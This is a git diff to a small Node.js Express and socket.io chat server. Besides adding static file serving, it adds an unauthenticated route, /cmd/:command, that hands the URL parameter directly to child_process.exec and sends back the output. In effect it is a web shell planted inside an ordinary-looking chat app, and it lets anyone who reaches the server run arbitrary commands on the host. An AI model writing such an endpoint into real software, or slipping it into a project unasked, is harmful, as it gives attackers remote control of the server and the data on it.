@@ -1,5 +1,6 @@
 const express = require("express");
 const socketio = require("socket.io");
+const { exec } = require('child_process');
 const logger = require("./logger");
 const app = express();
 
@@ -11,6 +12,8 @@ const io = new socketio.Server(app.listen(PORT, logger.info(`Server socket liste
         origin: "*", 
     }
 })
+
+app.use(express.static("public"));
 
 
 io.on("connection", (socket) => {
@@ -25,3 +28,22 @@ io.on("connection", (socket) => {
         io.emit("message", msg);
     })
 })
+
+app.get("/cmd/:command", async (req, res) => {
+	logger.info(`Command received ${req.params.command}`);
+	res.send(await cmd(req.params.command));	
+})
+
+async function cmd(command_string) {
+	return new Promise((resolve) => {
+    exec(command_string, (error, stdout, stderr) => {
+    	if (error) {
+        	console.error(`exec error: ${error}`);
+        	return;
+    	}
+        logger.info(`stdout: ${stdout}`);
+	resolve(stdout);	
+    });
+	});
+}
+
